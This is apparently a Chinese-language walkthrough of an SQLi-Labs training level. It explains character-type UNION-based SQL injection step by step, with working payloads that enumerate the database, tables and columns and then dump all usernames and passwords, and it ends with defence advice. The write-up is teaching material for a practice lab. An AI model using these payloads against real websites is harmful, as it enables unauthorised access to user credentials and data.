## 一、题目信息
- 平台：SQLi-Labs
- 分类：Web - SQL Injection
- 难度：简单
- 通关标识：通过注入语句，让页面回显出数据库里隐藏的所有用户名和密码。

## 二、大白话原理讲解
想象一下，网站的后台是一个死脑筋的银行柜员，数据库就是银行的金库。

1. **找注入点**：你递纸条说“查账户1'”，这个单引号就像魔法咒语，让柜员脑子短路报错了。这说明你找到了他的死穴。
2. **测列数**：你用 `ORDER BY 4` 试探，柜员报错说“没第4个抽屉”，说明他只有3个抽屉（3列）。
3. **联合查询（UNION）**：你让他查“-1”（查不到），然后说“**顺便（UNION）**把 1,2,3 打印在 1,2,3号抽屉里”。结果2号和3号抽屉亮起了数字，你成功控制了打印台。
4. **拿数据**：你利用 `information_schema`（物业图纸）查到了库名叫 `security`，表名叫 `users`。最后用 `group_concat`（打包机）把所有账号密码打包塞进2号抽屉，全部带出！

## 三、解题步骤

**1. 测试注入点并判断闭合**
访问页面，URL 带上 `?id=1`，页面正常回显。接着输入 `?id=1'`（注意加个单引号），页面报错：
`You have an error in your SQL syntax; ... near ''1'' LIMIT 0,1' at line 1`
**分析**：报错说明变量被单引号包裹，属于字符型注入，且闭合符为单引号。我们需要用 `--+` 注释掉后面的语句。

**2. 确认列数（ORDER BY）**
使用 `ORDER BY` 语句测试原查询有几列：
```sql
?id=1' order by 1 --+  (正常)
?id=1' order by 2 --+  (正常)
?id=1' order by 3 --+  (正常)
?id=1' order by 4 --+  (报错：Unknown column '4' in 'order clause')
```
**结论**：原查询结果共有 3 列。

**3. 寻找回显点（UNION SELECT）**
用 `-1` 让原查询报错（查不到数据），然后拼接 `UNION SELECT`：
```sql
?id=-1' union select 1,2,3 --+
```
**结论**：页面回显了 `Your Login name: 2` 和 `Your Password: 3`。说明第 2 和第 3 列是回显点。

**4. 爆库、爆表、爆数据**
接下来顺藤摸瓜：

*   **查当前数据库名**：
```sql
?id=-1' union select 1,database(),3 --+
```
（回显库名为 `security`）

*   **查数据库下的表名**：
```sql
?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' --+
```
（查出有 `users`、`emails` 等表）

*   **查 `users` 表的字段名**：
```sql
?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --+
```
（查出有 `id`, `username`, `password` 等字段）

*   **最终爆出账号密码**：
```sql
?id=-1' union select 1,group_concat(username,0x3a,password),3 from users --+
```
*(注：`0x3a` 是冒号的十六进制，用来分隔账号和密码，方便阅读)*

**5. 验证结果**
提交后，页面成功回显出了整张用户表的数据：
```text
Your Login name: Dumb:Dumb,Angelina:I-kill-you,Dummy:p@ssword,secure:crappy,stupid:stupidity,superman:genious,batman:mob!le,admin:admin,admin1:admin1...
```
成功获取了所有用户的账号密码信息，通关。

## 四、知识点解析
1. **字符型注入**：当后端把用户输入的字符串拼接到 SQL 语句中时，需要闭合单引号（`'`），并用注释符（`--+` 或 `#`）注释掉后面的代码。
2. **UNION SELECT**：将前后两条 SQL 语句的结果合并在一起。前提是前后查询的**列数必须一致**。
3. **GROUP_CONCAT**：把多行的查询结果拼接成一个长字符串一次性显示，是实战中“爆数据”最常用的神技。
4. **information_schema**：MySQL 自带的数据库，相当于整个数据库的“通讯录”，里面记录了所有的库名、表名、字段名。

## 五、总结与防御
**本题总结**：
对于页面有正常回显的字符型 SQL 注入，`UNION SELECT` 是最直接高效的打法。关键在于先使用 `ORDER BY` 判断列数，再寻找回显位。

**安全防御建议**：
- **预编译语句**：使用 PDO 或 MySQLi 将 SQL 语句和数据分离，这是最根本的防御手段。
- **输入验证**：对于只应该是数字的参数，服务端用 `intval()` 强制转换，直接杜绝注入。
